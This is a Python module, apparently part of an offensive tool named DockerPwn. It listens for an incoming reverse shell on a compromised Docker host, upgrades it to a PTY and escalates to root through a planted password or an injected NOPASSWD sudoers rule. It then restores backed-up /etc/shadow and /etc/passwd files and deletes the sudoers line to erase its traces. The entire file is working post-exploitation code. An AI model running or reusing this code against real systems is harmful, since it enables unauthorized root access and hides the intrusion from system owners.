#!/usr/bin/python3

import nclib
import time
import os

def listen(c2, method):
    
    print('[+] Listening for connection - We\'ll automatically escalate to root, and get a PTY.\n')
    print('[!] Session I/O will be logged to ./DockerPwn.log\n')
    hostIP = c2.split(':')[0]
    hostPort = int(c2.split(':')[1])
    dockerLog = open('DockerPwn.log', 'wb')

    if method == 'shadowpwn':
        shellListener = nclib.Netcat(listen=(hostIP, hostPort), log_send=dockerLog, log_recv=dockerLog)
        shellListener.send(bytes('python3 -c \'import pty; pty.spawn("/bin/bash")\'', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(bytes('export TERM=screen', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(bytes('su', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(bytes('DockerPwn', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(bytes('cp /var/backups/shadow.bak /etc/shadow; cp /var/backups/passwd.bak /etc/passwd', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(b'\x0C')
        shellListener.send(bytes('id; hostname; date;', 'utf-8'))
        shellListener.send(b'\x0D')

    elif method == 'userpwn':
        shellListener = nclib.Netcat(listen=(hostIP, hostPort), log_send=dockerLog, log_recv=dockerLog)
        shellListener.send(bytes('python3 -c \'import pty; pty.spawn("/bin/bash")\'', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(bytes('export TERM=screen', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(bytes('sudo su', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(bytes("cp /var/backups/shadow.bak /etc/shadow; cp /var/backups/passwd.bak /etc/passwd; sed -i 's/DockerPwn ALL=(ALL) NOPASSWD: ALL//g' /etc/sudoers", "utf-8"))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(b'\x0C')
        shellListener.send(bytes('id; hostname; date', 'utf-8'))
        shellListener.send(b'\x0D')
    
    elif method == 'chrootpwn':
        shellListener = nclib.Netcat(listen=(hostIP, hostPort), log_send=dockerLog, log_recv=dockerLog)
        shellListener.send(bytes('python3 -c \'import pty; pty.spawn("/bin/bash")\'', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(bytes('export TERM=screen', 'utf-8'))
        shellListener.send(b'\x0D')
        time.sleep(1.5)
        shellListener.send(b'\x0C')
        shellListener.send(bytes('id; hostname; date', 'utf-8'))
        shellListener.send(b'\x0D')
        os.remove('shell.sh')

    shellListener.interact()

